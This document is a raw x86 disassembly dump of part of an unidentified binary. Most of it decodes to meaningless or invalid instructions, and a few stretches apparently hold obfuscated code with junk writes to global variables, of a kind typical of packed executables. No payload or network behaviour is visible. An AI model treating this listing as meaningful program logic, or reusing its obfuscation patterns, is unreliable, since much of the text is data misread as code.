  40a4e8:	(bad)  
  40a4ea:	add    DWORD PTR [edi-0x17de4e93],esi
  40a4f0:	mov    ds:0x18a238e8,al
  40a4f5:	push   ds
  40a4f6:	add    eax,0x865be44
  40a4fb:	retf   0xc03b
  40a4fe:	pop    ebx
  40a4ff:	pop    ebp
  40a500:	cmp    BYTE PTR [ecx-0x5e050db6],bh
  40a506:	or     edx,edi
  40a508:	and    BYTE PTR [esi-0x2681c1a8],ah
  40a50e:	lods   al,BYTE PTR ds:[esi]
  40a50f:	sti    
  40a510:	mov    al,0x3b
  40a512:	data16 jae 0x40a49e
  40a515:	xchg   esp,eax
  40a516:	scas   eax,DWORD PTR es:[edi]
  40a517:	xchg   esi,eax
  40a518:	cdq    
  40a519:	stos   BYTE PTR es:[edi],al
  40a51a:	push   ebp
  40a51b:	into   
  40a51c:	cmp    al,0xec
  40a51e:	lods   al,BYTE PTR ds:[esi]
  40a51f:	or     cl,ah
  40a521:	dec    edi
  40a522:	cmp    al,0x54
  40a524:	xor    ah,ch
  40a526:	mov    WORD PTR ds:0xa5d34a93,cs
  40a52c:	mov    al,0x4f
  40a52e:	int3   
  40a52f:	iret   
  40a530:	xlat   BYTE PTR ds:[ebx]
  40a531:	fwait
  40a532:	test   esp,0x1bca1a2f
  40a538:	xchg   ecx,eax
  40a539:	minps  xmm1,XMMWORD PTR [eax+0x57b3982]
  40a540:	fldcw  WORD PTR [ebp-0x143d5a7f]
  40a546:	mov    ah,0xa1
  40a548:	jp     0x40a562
  40a54a:	push   esp
  40a54b:	push   esp
  40a54c:	fild   WORD PTR [edi+0x26996aa6]
  40a552:	out    dx,eax
  40a553:	adc    al,0xcf
  40a555:	or     eax,0xc9379a79
  40a55a:	out    dx,eax
  40a55b:	push   esi
  40a55c:	cmp    BYTE PTR [edi],ah
  40a55e:	adc    al,BYTE PTR [ebx-0x35]
  40a561:	jmp    0xe6a75df4
  40a566:	push   edi
  40a567:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a569:	repz mov esi,0x65f752c7
  40a56f:	push   ss
  40a570:	aas    
  40a571:	xchg   edi,eax
  40a572:	shl    BYTE PTR [esi+0x64],cl
  40a575:	(bad)  
  40a576:	xlat   BYTE PTR ds:[ebx]
  40a577:	inc    eax
  40a578:	loopne 0x40a5c4
  40a57a:	mov    edi,0xf26eb4ad
  40a57f:	cmp    cl,dl
  40a581:	repnz pop ecx
  40a583:	mov    eax,ds:0x8778112c
  40a588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a589:	mov    ah,0xcd
  40a58b:	or     esp,DWORD PTR [eax+0x17]
  40a58e:	(bad)  
  40a58f:	xor    ebx,ebx
  40a591:	adc    BYTE PTR [ebx],dh
  40a593:	ss mov bl,cl
  40a596:	pusha  
  40a597:	jp     0x40a5f0
  40a599:	xor    ch,dh
  40a59b:	or     al,0x67
  40a59d:	xchg   ecx,eax
  40a59e:	xchg   DWORD PTR [eax+0x3d574a16],edx
  40a5a4:	shr    DWORD PTR [edi],cl
  40a5a6:	popa   
  40a5a7:	sub    DWORD PTR [edi-0x53],edx
  40a5aa:	sub    DWORD PTR [esi+ebp*2-0x4c],esp
  40a5ae:	mov    esi,0x6c5e51fa
  40a5b3:	ret    0xf3a
  40a5b6:	sbb    ch,bh
  40a5b8:	pop    esp
  40a5b9:	mul    ebp
  40a5bb:	xchg   edx,eax
  40a5bc:	aas    
  40a5bd:	test   eax,0xd8878c83
  40a5c2:	dec    ecx
  40a5c3:	mov    edx,0x716fd614
  40a5c8:	jae    0x40a5d6
  40a5ca:	cmc    
  40a5cb:	or     BYTE PTR [esi+0x194f0ea5],0xd7
  40a5d2:	lds    ecx,FWORD PTR [esp+ebp*1-0x289b07d5]
  40a5d9:	fnstcw WORD PTR [edi]
  40a5db:	out    dx,eax
  40a5dc:	xor    dl,BYTE PTR [ecx+0x1112b589]
  40a5e2:	mov    edx,0xdf129df2
  40a5e7:	icebp  
  40a5e8:	cmp    DWORD PTR [edx-0xc],esp
  40a5eb:	or     eax,0x80e32891
  40a5f0:	push   edx
  40a5f1:	ficomp DWORD PTR [edx]
  40a5f3:	cmp    edi,DWORD PTR [esi+0x5]
  40a5f6:	js     0x40a5bf
  40a5f8:	mov    dl,0xb3
  40a5fa:	jp     0x40a62c
  40a5fc:	xchg   edi,eax
  40a5fd:	mov    dl,BYTE PTR [edi+0x52560871]
  40a603:	push   0x46
  40a605:	sub    eax,DWORD PTR [edi+edi*2+0x20]
  40a609:	outs   dx,BYTE PTR ds:[esi]
  40a60a:	cmp    ecx,DWORD PTR [edx-0x43]
  40a60d:	mov    eax,DWORD PTR [ecx-0x3f25f3e0]
  40a613:	sahf   
  40a614:	adc    cl,BYTE PTR [ebx+0x5fea2895]
  40a61a:	int    0x5b
  40a61c:	mov    ds:0x64daebac,eax
  40a621:	mov    eax,0x7cb9a773
  40a626:	xor    BYTE PTR [ebx-0x2e190ea4],cl
  40a62c:	and    eax,0x4e629892
  40a631:	push   0x7d
  40a633:	clc    
  40a634:	dec    ebp
  40a635:	add    BYTE PTR [ebx],ch
  40a637:	shl    cl,1
  40a639:	dec    ebp
  40a63a:	out    0x26,eax
  40a63c:	add    eax,0xe326cf58
  40a641:	sahf   
  40a642:	mov    ebx,0x9cb8f8d8
  40a647:	inc    ebp
  40a648:	dec    edx
  40a649:	mov    eax,0x90aba64b
  40a64e:	ret    0xf036
  40a651:	add    edx,DWORD PTR [eax+0x68]
  40a654:	inc    esp
  40a655:	out    0x32,al
  40a657:	push   ss
  40a658:	mov    ds:0x1929fde4,al
  40a65d:	pop    ds
  40a65e:	int3   
  40a65f:	js     0x40a62b
  40a661:	fmulp  st(3),st
  40a663:	or     al,0x8e
  40a665:	cmp    eax,0x796db5f7
  40a66a:	imul   edx,DWORD PTR [edx+0xaa5ab1b],0x995ad7ed
  40a674:	mov    BYTE PTR [eax],cl
  40a676:	aas    
  40a677:	add    eax,0x5f760ac5
  40a67c:	(bad)  
  40a67d:	mov    dl,0xd9
  40a67f:	outs   dx,DWORD PTR ds:[esi]
  40a680:	stos   BYTE PTR es:[edi],al
  40a681:	pop    es
  40a682:	lods   eax,DWORD PTR ds:[esi]
  40a683:	out    0x16,eax
  40a685:	or     BYTE PTR [edx-0x507e63a8],bl
  40a68b:	ins    DWORD PTR es:[edi],dx
  40a68c:	ins    BYTE PTR es:[edi],dx
  40a68d:	and    al,0xe8
  40a68f:	mov    ?,WORD PTR [eax]
  40a691:	add    eax,0x88421390
  40a696:	jg     0x40a632
  40a698:	cld    
  40a699:	mov    bh,0x85
  40a69b:	cmp    eax,0x8fa2bf12
  40a6a0:	ins    BYTE PTR es:[edi],dx
  40a6a1:	and    eax,0x921b9de4
  40a6a6:	add    al,0xfe
  40a6a8:	push   ss
  40a6a9:	pop    ss
  40a6aa:	mov    edx,0x5b8675e8
  40a6af:	cmp    bl,ah
  40a6b1:	or     eax,0x71cf60b3
  40a6b6:	loopne 0x40a6cb
  40a6b8:	(bad)  
  40a6b9:	jl     0x40a6fd
  40a6bb:	push   ecx
  40a6bc:	cmc    
  40a6bd:	scas   al,BYTE PTR es:[edi]
  40a6be:	jg     0x40a66d
  40a6c0:	mov    ah,0xb7
  40a6c2:	add    al,BYTE PTR [esi+0x42e770d6]
  40a6c8:	iret   
  40a6c9:	pop    es
  40a6ca:	jmp    0x40a6e3
  40a6cc:	lods   eax,DWORD PTR ds:[esi]
  40a6cd:	push   es
  40a6ce:	add    DWORD PTR [edx+0x411ef3df],esp
  40a6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d5:	pop    ebx
  40a6d6:	loope  0x40a6a3
  40a6d8:	retf   
  40a6d9:	jg     0x40a6dc
  40a6db:	or     BYTE PTR [edx+ecx*4+0x5668c7bb],al
  40a6e2:	add    BYTE PTR [edx+0x3d],bh
  40a6e5:	ins    BYTE PTR es:[edi],dx
  40a6e6:	dec    DWORD PTR [edx-0x7e]
  40a6e9:	or     esp,edi
  40a6eb:	push   DWORD PTR [ebx+edi*1-0x8]
  40a6ef:	mov    DWORD PTR ds:0x43376b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x328fec0c
  40a7ac:	sbb    al,BYTE PTR [esi+edx*1+0x387e7eed]
  40a7b3:	jl     0x40a833
  40a7b5:	jle    0x40a791
  40a7b7:	test   DWORD PTR [esi-0x1a],0x241966b8
  40a7be:	adc    ax,cx
  40a7c1:	ins    DWORD PTR es:[edi],dx
  40a7c2:	jb     0x40a7cd
  40a7c4:	fnstsw WORD PTR [edx+0x6e508b74]
  40a7ca:	rcr    DWORD PTR [edx],1
  40a7cc:	scas   eax,DWORD PTR es:[edi]
  40a7cd:	adc    DWORD PTR [ecx],0xffffffe8
  40a7d0:	stos   BYTE PTR es:[edi],al
  40a7d1:	mov    bh,ch
  40a7d3:	ficom  DWORD PTR [ecx-0x7f]
  40a7d6:	xchg   esi,eax
  40a7d7:	addr16 mov edi,0xb21cfe5d
  40a7dd:	pop    ss
  40a7de:	xchg   edi,eax
  40a7df:	fimul  WORD PTR [ecx-0x67]
  40a7e2:	push   ss
  40a7e3:	xor    DWORD PTR [edi+0x4a5c7bcd],esp
  40a7e9:	leave  
  40a7ea:	ds pop eax
  40a7ec:	sub    al,0xd1
  40a7ee:	fscale 
  40a7f0:	mov    edx,0xb2d44a10
  40a7f5:	and    BYTE PTR [esi+0x5b3dc77d],dl
  40a7fb:	adc    DWORD PTR [eax+0x4b],edi
  40a7fe:	mov    dl,0xbf
  40a800:	retf   
  40a801:	pop    esp
  40a802:	stc    
  40a803:	ins    DWORD PTR es:[edi],dx
  40a804:	pop    edx
  40a805:	iret   
  40a806:	jg     0x40a7e2
  40a808:	sahf   
  40a809:	ffreep st(2)
  40a80b:	arpl   WORD PTR [ecx+0x6ea6d533],si
  40a811:	mov    edx,0xee3934e7
  40a816:	punpckhdq mm0,QWORD PTR [ebp-0x50]
  40a81a:	cmp    al,0x45
  40a81c:	ror    DWORD PTR [ebp+0x5f],cl
  40a81f:	lea    eax,[eax]
  40a821:	or     ebp,DWORD PTR [eax+0x7a]
  40a824:	retf   
  40a825:	fnsave [ebx]
  40a827:	and    DWORD PTR [eax+0x26303ed0],0xf5aeef6f
  40a831:	cli    
  40a832:	repnz adc DWORD PTR [ebp+0x6c],esi
  40a836:	adc    al,0x2b
  40a838:	mov    edx,0x673c4940
  40a83d:	sub    ebx,DWORD PTR [eax]
  40a83f:	ins    DWORD PTR es:[edi],dx
  40a840:	pushf  
  40a841:	jbe    0x40a88a
  40a843:	lds    ebp,FWORD PTR [edi]
  40a845:	push   ss
  40a846:	fstp   DWORD PTR [ecx-0x57fdc903]
  40a84c:	jp     0x40a7eb
  40a84e:	push   ss
  40a84f:	mov    ebx,0x87b5c1c8
  40a854:	sbb    eax,0x72414642
  40a859:	in     al,dx
  40a85a:	pop    ebx
  40a85b:	sub    eax,0xa8e1a9d8
  40a860:	repnz fidiv WORD PTR [ecx]
  40a863:	pop    ebx
  40a864:	fnstcw WORD PTR [esi-0x5c]
  40a867:	fcom   QWORD PTR [ecx]
  40a869:	pop    ss
  40a86a:	add    BYTE PTR [esi],ch
  40a86c:	push   ebx
  40a86d:	lds    ebx,FWORD PTR [edx-0x44473724]
  40a873:	push   ecx
  40a874:	jae    0x40a8d9
  40a876:	aaa    
  40a877:	div    BYTE PTR [edi+0x60]
  40a87a:	pop    eax
  40a87b:	pop    esp
  40a87c:	mov    WORD PTR [ebx+0x63],ds
  40a87f:	fdiv   st(7),st
  40a881:	das    
  40a882:	mov    dh,0xd
  40a884:	pop    es
  40a885:	leave  
  40a886:	jno    0x40a8fb
  40a888:	or     ecx,edi
  40a88a:	sub    BYTE PTR [ebp+edx*8+0x76],dl
  40a88e:	mov    ds:0x1bac6374,eax
  40a893:	icebp  
  40a894:	pop    eax
  40a895:	mov    cl,0xa3
  40a897:	bound  ebx,QWORD PTR [ecx]
  40a899:	push   ss
  40a89a:	and    eax,0xe7bc0ad3
  40a89f:	call   0x7a076611
  40a8a4:	mov    ah,0x4e
  40a8a6:	adc    al,0x59
  40a8a8:	aad    0x29
  40a8aa:	imul   esi,eax,0x8
  40a8ad:	ins    DWORD PTR es:[edi],dx
  40a8ae:	jecxz  0x40a8d5
  40a8b0:	fisubr DWORD PTR [edi-0x7f041e7a]
  40a8b6:	arpl   WORD PTR [ebx-0x7e],si
  40a8b9:	dec    esi
  40a8ba:	and    BYTE PTR [esi+edi*2],dh
  40a8bd:	jns    0x40a8ee
  40a8bf:	xchg   ebx,eax
  40a8c0:	ficom  DWORD PTR [ecx]
  40a8c2:	mov    edi,0x3177ada4
  40a8c7:	jmp    0x2c82:0x8b83e0df
  40a8ce:	inc    esi
  40a8cf:	dec    ebp
  40a8d0:	shl    BYTE PTR [esi+0x208c3fc8],1
  40a8d6:	sti    
  40a8d7:	mov    WORD PTR [esi-0x124f4147],gs
  40a8dd:	push   edx
  40a8de:	xchg   ecx,eax
  40a8df:	call   0x42d2:0xb2339ddb
  40a8e6:	xor    eax,0x4f153bcd
  40a8eb:	sub    bl,ah
  40a8ed:	inc    eax
  40a8ee:	repz inc ecx
  40a8f0:	pop    esi
  40a8f1:	mov    ebp,0xee9cd6d3
  40a8f6:	xchg   ecx,eax
  40a8f7:	lock call FWORD PTR [ebx-0x7f]
  40a8fb:	adc    esp,DWORD PTR [esi-0x56bd7764]
  40a901:	aad    0x7b
  40a903:	jg     0x40a8cb
  40a905:	adc    dl,BYTE PTR ds:0xfa2cb2c2
  40a90b:	(bad)  
  40a90c:	xchg   ebx,eax
  40a90d:	jmp    FWORD PTR [ebp+0x59]
  40a910:	mov    BYTE PTR ss:[eax+0x171bafe4],dh
  40a917:	jmp    0x4152:0xb5583599
  40a91e:	lea    edi,[eax+0x613d2470]
  40a924:	jp     0x40a959
  40a926:	(bad)  
  40a927:	pop    ss
  40a928:	shl    edi,1
  40a92a:	out    dx,al
  40a92b:	arpl   WORD PTR [ebx],cx
  40a92d:	pushf  
  40a92e:	mov    eax,ds:0x4601b15d
  40a933:	loopne 0x40a901
  40a935:	mov    esp,0xce583140
  40a93a:	fwait
  40a93b:	out    dx,eax
  40a93c:	pop    DWORD PTR [ebp+0x1f]
  40a93f:	push   ds
  40a940:	scas   eax,DWORD PTR es:[edi]
  40a941:	imul   edx,DWORD PTR [ebx+0x2b4a49a6],0x5141cbb4
  40a94b:	cmp    DWORD PTR [ecx+0xf],ebp
  40a94e:	fld    QWORD PTR [ecx]
  40a950:	imul   ebp,DWORD PTR [esi+0x260cb992],0x24
  40a957:	jmp    0x7b82cc69
  40a95c:	push   ss
  40a95d:	and    eax,0x4ad25f46
  40a962:	mov    bl,al
  40a964:	push   edi
  40a965:	inc    edi
  40a966:	and    DWORD PTR [ebp+0x28],edx
  40a969:	mov    dl,0xad
  40a96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a96c:	jecxz  0x40a90e
  40a96e:	xchg   ebx,eax
  40a96f:	fidivr DWORD PTR ds:0x84cb1389
  40a975:	or     BYTE PTR [eax-0x17],bl
  40a978:	add    dh,BYTE PTR [edi]
  40a97a:	int    0x36
  40a97c:	adc    eax,0x8a08ab78
  40a981:	or     bh,BYTE PTR [ecx-0x70]
  40a984:	sahf   
  40a985:	pop    eax
  40a986:	lahf   
  40a987:	xchg   ecx,eax
  40a988:	add    BYTE PTR [ebx],0x9f
  40a98b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a98c:	adc    ebp,ecx
  40a98e:	lock pop edx
  40a990:	sub    ah,0xff
  40a993:	ins    DWORD PTR es:[edi],dx
  40a994:	ss stos DWORD PTR es:[edi],eax
  40a996:	idiv   BYTE PTR [edi-0x72]
  40a999:	rcl    DWORD PTR [ecx],1
  40a99b:	jmp    0xec58:0x2aca5939
  40a9a2:	lahf   
  40a9a3:	xor    dl,BYTE PTR [esi-0x56b9507b]
  40a9a9:	inc    esi
  40a9aa:	shr    dh,cl
  40a9ac:	and    DWORD PTR [ebp-0x55],ebp
  40a9af:	xor    al,0x6c
  40a9b1:	aam    0x4f
  40a9b3:	jmp    0x2ed0:0xf5cc9a04
  40a9ba:	xor    edi,DWORD PTR [edi+0x56]
  40a9bd:	push   0x63fec8e4
  40a9c2:	or     DWORD PTR [ebp+0x3d],esi
  40a9c5:	gs inc ebx
  40a9c7:	imul   edx,edx,0xb
  40a9ca:	or     al,0xab
  40a9cc:	jl     0x40a960
  40a9ce:	push   ebx
  40a9cf:	xor    ah,ch
  40a9d1:	imul   BYTE PTR [ebx]
  40a9d3:	sti    
  40a9d4:	jecxz  0x40a9de
  40a9d6:	jp     0x40a95a
  40a9d8:	cmp    DWORD PTR [edi+0x5f23d24],ecx
  40a9de:	xchg   BYTE PTR [eax+0x6b3530f2],bl
  40a9e4:	add    bl,dh
  40a9e6:	pop    ds
  40a9e7:	ins    BYTE PTR es:[edi],dx
  40a9e8:	jl     0x40a9b8
  40a9ea:	mov    eax,0xc0ae7873
  40a9ef:	stc    
  40a9f0:	lods   al,BYTE PTR ds:[esi]
  40a9f1:	dec    edx
  40a9f2:	mov    ch,0x44
  40a9f4:	mov    ch,0x3f
  40a9f6:	data16 mov al,ds:0x17fe1032
  40a9fc:	mov    DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	or     bh,ah
  40aa36:	add    bl,BYTE PTR [eax-0x30]
  40aa39:	jmp    0x40aab9
  40aa3b:	jle    0x40aa75
  40aa3d:	jl     0x40aabd
  40aa3f:	jle    0x40aa18
  40aa41:	push   ebx
  40aa42:	cli    
  40aa43:	fisub  WORD PTR [ebx+edx*4+0x71]
  40aa47:	jns    0x40aab7
  40aa49:	xlat   BYTE PTR ds:[ebx]
  40aa4a:	or     dl,al
  40aa4c:	mov    edx,0x5086eee
  40aa51:	lods   al,BYTE PTR ds:[esi]
  40aa52:	and    al,0xac
  40aa54:	push   ebx
  40aa55:	dec    edx
  40aa56:	in     eax,dx
  40aa57:	mov    BYTE PTR [ebx-0x522a842f],bh
  40aa5d:	xchg   edx,eax
  40aa5e:	and    esp,ecx
  40aa60:	mov    edx,0xeefd273
  40aa65:	neg    BYTE PTR [ebx]
  40aa67:	mov    dl,0x76
  40aa69:	mov    dl,0xc9
  40aa6b:	and    eax,0x17e88e95
  40aa70:	outs   dx,BYTE PTR ds:[esi]
  40aa71:	or     dh,BYTE PTR [ecx]
  40aa73:	fst    DWORD PTR [edx+eax*8]
  40aa76:	pop    esp
  40aa77:	ror    BYTE PTR [esp+esi*4],cl
  40aa7a:	call   0xd7820b05
  40aa7f:	mov    al,ds:0x16b4056e
  40aa84:	aad    0x65
  40aa86:	fldcw  WORD PTR es:[edx-0x30c6be57]
  40aa8d:	stos   DWORD PTR es:[edi],eax
  40aa8e:	loop   0x40aa2c
  40aa90:	push   esp
  40aa91:	sub    ebx,0xfea7b0ba
  40aa97:	or     DWORD PTR [esi],eax
  40aa99:	mov    fs,WORD PTR [ebp+0x4]
  40aa9c:	adc    esp,eax
  40aa9e:	lea    ebp,[edi]
  40aaa0:	das    
  40aaa1:	and    eax,0x5fcfc359
  40aaa6:	jmp    0x40aafd
  40aaa8:	xor    ebp,ebx
  40aaaa:	adc    DWORD PTR cs:0x2cc4b50a,edx
  40aab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aab2:	adc    DWORD PTR [edx],edx
  40aab4:	jmp    0x1a8c100f
  40aab9:	mov    dl,0x7e
  40aabb:	ror    BYTE PTR [ebx],0xa0
  40aabe:	rcl    BYTE PTR [eax+0x2311c847],cl
  40aac4:	sub    edi,DWORD PTR [edi-0x4f]
  40aac7:	jmp    0x40aa78
  40aac9:	nop
  40aaca:	push   ds
  40aacb:	push   edi
  40aacc:	fistp  DWORD PTR [esi+0x1a]
  40aacf:	in     eax,0x8f
  40aad1:	imul   eax,edx,0x18
  40aad4:	ds hlt 
  40aad6:	push   ebp
  40aad7:	es cwde 
  40aad9:	pop    esi
  40aada:	rcl    al,0xe3
  40aadd:	mov    eax,0x31307248
  40aae2:	xor    eax,0xe0121158
  40aae7:	inc    edx
  40aae8:	loope  0x40ab32
  40aaea:	mov    BYTE PTR [eax-0x75],0x73
  40aaee:	jno    0x40ab5e
  40aaf0:	es pop ss
  40aaf2:	jnp    0x40aab6
  40aaf4:	(bad)  
  40aaf5:	dec    ecx
  40aaf6:	shr    BYTE PTR [eax],0x2
  40aaf9:	mov    ds:0xb8a1920,eax
  40aafe:	imul   edx,eax,0x4a
  40ab01:	inc    ebp
  40ab02:	jge    0x40aac8
  40ab04:	xor    cl,BYTE PTR [ecx]
  40ab06:	xor    edx,edi
  40ab08:	test   eax,0xfa5a824a
  40ab0d:	jmp    0xde29:0xd919607e
  40ab14:	jecxz  0x40aabc
  40ab16:	jb     0x40ab8b
  40ab18:	mov    bh,0xdf
  40ab1a:	xchg   ebx,eax
  40ab1b:	out    dx,eax
  40ab1c:	sti    
  40ab1d:	ins    BYTE PTR es:[edi],dx
  40ab1e:	xchg   ecx,eax
  40ab1f:	fs xchg bp,ax
  40ab22:	mov    eax,cs:0x1f6f001e
  40ab28:	icebp  
  40ab29:	cli    
  40ab2a:	pushf  
  40ab2b:	push   ss
  40ab2c:	sub    edx,DWORD PTR [ecx+0x25]
  40ab2f:	lods   eax,DWORD PTR ds:[esi]
  40ab30:	cld    
  40ab31:	(bad)  
  40ab32:	mov    ss:0xca94fcff,eax
  40ab38:	push   ecx
  40ab39:	in     al,0x82
  40ab3b:	pop    eax
  40ab3c:	test   ebx,0xa45cd3ca
  40ab42:	shl    DWORD PTR [esi-0x3a],0xfe
  40ab46:	mov    edx,0x5753c2f3
  40ab4b:	lea    esp,[eax]
  40ab4d:	test   BYTE PTR [ecx+0x6227e322],dl
  40ab53:	shl    BYTE PTR [eax-0x5b75140c],cl
  40ab59:	enter  0xa395,0x9e
  40ab5d:	xchg   edx,eax
  40ab5e:	ret    0x1e23
  40ab61:	xor    al,BYTE PTR [edi-0x5b0edbcb]
  40ab67:	jnp    0x40ab8d
  40ab69:	ds dec esp
  40ab6b:	fidiv  DWORD PTR [ebx+0x2a486a78]
  40ab71:	push   0xffffffdc
  40ab73:	rcl    DWORD PTR [edi-0x7188ae3],1
  40ab79:	gs in  eax,dx
  40ab7b:	and    al,BYTE PTR [edi-0x70]
  40ab7e:	ja     0x40ab1e
  40ab80:	cwde   
  40ab81:	arpl   WORD PTR [edi],cx
  40ab83:	sub    al,0xc7
  40ab85:	xchg   ecx,eax
  40ab86:	pop    edx
  40ab87:	fisubr WORD PTR [eax-0x2e868331]
  40ab8d:	mov    ecx,0x8486ff4d
  40ab92:	or     DWORD PTR [edx-0x10],ebp
  40ab95:	add    dl,BYTE PTR [ebp-0x3a]
  40ab98:	mov    ds:0xc7a5666f,al
  40ab9d:	and    BYTE PTR [ebx],ah
  40ab9f:	pusha  
  40aba0:	imul   eax,DWORD PTR [ebx-0x7be760fe],0x81fff640
  40abaa:	push   esi
  40abab:	cmp    eax,0x1e463093
  40abb0:	mov    ds:0xf12e2c57,eax
  40abb5:	mov    ch,0xa0
  40abb7:	out    0x32,eax
  40abb9:	lock shl DWORD PTR [edx-0x56607c9e],1
  40abc0:	pushf  
  40abc1:	out    0xd8,eax
  40abc3:	pusha  
  40abc4:	xor    al,0x72
  40abc6:	jmp    0x2d7af6a5
  40abcb:	push   ebx
  40abcc:	cmc    
  40abcd:	cmc    
  40abce:	fmul   DWORD PTR [edx-0x40cbc069]
  40abd4:	int    0x3
  40abd6:	xor    al,0x4e
  40abd8:	add    ebp,DWORD PTR [ebp-0x4d]
  40abdb:	add    al,0x97
  40abdd:	loopne 0x40ac10
  40abdf:	or     al,0xe9
  40abe1:	retf   
  40abe2:	jbe    0x40aba4
  40abe4:	es push ebp
  40abe6:	aad    0xea
  40abe8:	icebp  
  40abe9:	mov    bh,0x1c
  40abeb:	fisub  DWORD PTR [ebx+0x35]
  40abee:	jg     0x40ac54
  40abf0:	repz call 0x4a70:0x2513cea6
  40abf8:	xlat   BYTE PTR ds:[ebx]
  40abf9:	dec    edi
  40abfa:	sti    
  40abfb:	cmp    al,0x97
  40abfd:	xchg   esp,eax
  40abfe:	mov    BYTE PTR [edi-0x536ec648],bl
  40ac04:	jnp    0x40ac12
  40ac06:	xchg   bh,bh
  40ac08:	sbb    ah,BYTE PTR [ecx]
  40ac0a:	mov    ah,0x3a
  40ac0c:	mov    dh,0xd0
  40ac0e:	outs   dx,DWORD PTR ds:[esi]
  40ac0f:	dec    ebp
  40ac10:	xchg   esi,eax
  40ac11:	push   esi
  40ac12:	jle    0x40abdb
  40ac14:	and    bh,BYTE PTR [ecx-0x4d]
  40ac17:	loop   0x40ac5a
  40ac19:	stos   DWORD PTR es:[edi],eax
  40ac1a:	clc    
  40ac1b:	and    ecx,DWORD PTR [edx]
  40ac1d:	test   eax,0xa7673c91
  40ac22:	addr16 (bad) 
  40ac24:	push   ebx
  40ac25:	std    
  40ac26:	(bad)  
  40ac27:	cmp    DWORD PTR [edi],esp
  40ac29:	push   cs
  40ac2a:	or     al,0xd2
  40ac2c:	jmp    0x230d:0x39a7d370
  40ac33:	sub    dh,ch
  40ac35:	pop    ebx
  40ac36:	cmp    esp,DWORD PTR [ebx-0x66080b9a]
  40ac3c:	lods   al,BYTE PTR ds:[esi]
  40ac3d:	adc    al,0xb3
  40ac3f:	mov    cl,0xc2
  40ac41:	dec    ebx
  40ac42:	xchg   ecx,eax
  40ac43:	inc    esi
  40ac44:	push   cs
  40ac45:	shl    esp,1
  40ac47:	mov    esp,0xa63ac569
  40ac4c:	cmp    esp,ecx
  40ac4e:	sbb    eax,0x2f1bc94a
  40ac53:	push   ds
  40ac54:	pop    ecx
  40ac55:	lock ret 
  40ac57:	fimul  DWORD PTR [ecx]
  40ac59:	pop    ebx
  40ac5a:	cmp    esp,DWORD PTR [ecx]
  40ac5c:	mov    ah,0x56
  40ac5e:	add    eax,0xcebff9d4
  40ac63:	hlt    
  40ac64:	push   edi
  40ac65:	sub    eax,DWORD PTR [ebx+0x3]
  40ac68:	ja     0x40acde
  40ac6a:	dec    ecx
  40ac6b:	icebp  
  40ac6c:	pop    esi
  40ac6d:	fs scas eax,DWORD PTR es:[edi]
  40ac6f:	ficomp DWORD PTR ss:[ebp+0x4]
  40ac73:	jecxz  0x40aca8
  40ac75:	pushf  
  40ac76:	xchg   BYTE PTR gs:[ecx],dl
  40ac79:	lock pop ss
  40ac7b:	jmp    0x2c1a4de5
  40ac80:	and    ebx,DWORD PTR [eax+edx*8]
  40ac83:	push   esp
  40ac84:	out    0x61,al
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x43376b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4337ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
